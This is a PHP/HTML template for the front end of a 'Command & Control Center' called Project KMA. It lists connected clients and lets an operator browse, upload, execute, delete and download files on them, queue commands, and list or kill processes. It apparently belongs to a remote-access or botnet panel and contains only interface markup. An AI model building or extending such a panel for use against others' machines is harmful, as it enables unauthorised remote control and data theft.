<?php include("session.inc.php"); ?>

<html>

<head>
	
	<title>Project KMA</title>
	
	<link rel="shortcut icon" href="images/favicon.ico" />
	<link rel="stylesheet" type="text/css" href="style.css" />
	<script type="text/javascript" src="js/jquery-1.7.2.min.js" ></script>
	<script type="text/javascript" src="js/jquery.smooth_tabs.1.1.js" ></script>
	<script type="text/javascript" src="custom.js"></script>

</head>


<body>

	<div id="header">
		<div id="logo">
			<span class="title"><b>Project KMA</b></span>
			<span class="description">Command & Control Center</span>
		</div>
		<div class="right"><a href="index.php?logout=true">Sign Out</a></div>
		<div class="clear"></div>
	</div>

	<div id="pagewrap">
	
		<div id="content-left">
			<div class="content-wrapper">
			
				<div class="client-selected"><b>Client:</b> <span id="client"></span></div>
				
				<div class="smoothTabs" name="tabs">
					<ul>
						<li><a href="#tabs" id="browse-tabsmenu">Browse</a></li>
						<li><a href="#tabs" id="commands-tabsmenu">Commands</a></li>
						<li><a href="#tabs" id="processes-tabsmenu">Processes</a></li>
						<li><a href="#tabs" id="notes-tabsmenu">Notes</a></li>
					</ul>
					
					<div class="tab filestab">
						<div class="wrapper">
							<h2>File Manager</h2>
							
							<span id="btnIcons">
								<a href="javascript:" title="Home" id="btnHome" onclick="showHome();"></a>
								<a href="javascript:" title="Up" id="btnDirUp" onclick="directoryUp();"></a>
							</span>
							&nbsp;
							<input type="text" class="textbox" id="browsepath" value="" />&nbsp;
							<input type="button" value="Browse" id="btnBrowse" />
							
							<div id="browse-container">
								<div id="browse"></div>
							</div>
							
							
							<div id="fileoperations">
								<div id="selectedfile"></div>

								<a href="#" onclick="fileOperation('upload');">Upload</a> |
								<a href="#" onclick="fileOperation('execute');">Execute</a> |
								<a href="#" onclick="fileOperation('delete');">Delete</a>
							</div>
							
							<div class="right">
								<input type="text" class="textbox" id="downloadpath" value="" />&nbsp;
								<input type="button" value="Download" id="btnDownload" />
							</div>
							
							<div class="clear"></div>
							
						</div>
					</div>
					
					<div class="tab commandstab">
						<div class="wrapper">
							<h2>Commands</h2>
							
							<div id="commands-container">
								<div id="commands"></div>
							</div>

							<div id="commandinput">
							
								<input type="text" class="textbox command" value="" />&nbsp;
								<input type="text" class="textbox parameters" value="" />&nbsp;
								<input type="button" value="Add" id="btnAddCommand" />&nbsp;
								<input type="button" value="Clear" id="btnClearCommands" />
								
								<br />
								<a href="commands.txt" target="_blank" style="font-size: 10px;">Show Commands List</a>								
							</div>
						</div>
					</div>
					
					<div class="tab processestab">
						<div class="wrapper">
							<h2>Processes</h2>
							
							<input type="text" class="textbox" id="process" value="" />&nbsp;
							<input type="button" value="Kill Process" id="btnKillProcess" />&nbsp;	
							<input type="button" value="Get Processes" id="btnGetProcesses" />
							
							<div id="processlist-container">
								<div id="processlist"></div>
							</div>
						</div>
					</div>
			
					<div class="tab notestab">
						<div class="wrapper">
							<h2>Notes</h2>
							<textarea id="notes"></textarea>
							<input type="button" value="Save Notes" id="btnSaveNotes" />
						</div>
					</div>
			
					<div class="clear"></div>			
				</div>

				<div id="commandinfo">
					<b>Command:</b> <span class="command">--</span>&nbsp;&nbsp;|&nbsp;
					<b>Parameters:</b> <span class="parameters">--</span>
				</div>

			</div>
		</div>

		<div id="content-right" class="clients-box">
			<div class="content-wrapper">
		
				<h2>clients</h2>
			
				<ul id="clients">
				</ul>	

			</div>
		</div>
		
		<div class="clear"></div>
		<div class="line"></div>
		
		<!-- ----------------------------------------------------------- -->
		
		<div id="uploads-box">
			<div class="uploads-wrapper">
				<h2>Uploads</h2>
				
				<ul id="clients-uploads">
				</ul>
		
			</div>
		</div>
		
		
		<div id="serverfiles-box">
			<div class="serverfiles-wrapper">
				<h2>Server Files</h2>
				
				<iframe src="files.php" scrolling="no"></iframe> 			
		
			</div>
		</div>

		<div class="clear"></div>
		
		<br /><br />

		<div class="line"></div>
		
	</div>

	<!-- Preload Images -->
	<img src="images/home_hover.png" class="hidden" />
	<img src="images/up_hover.png" class="hidden" />
	<img src="images/dir.png" class="hidden" />
	<img src="images/drive.png" class="hidden" />
		
</body>

</html>




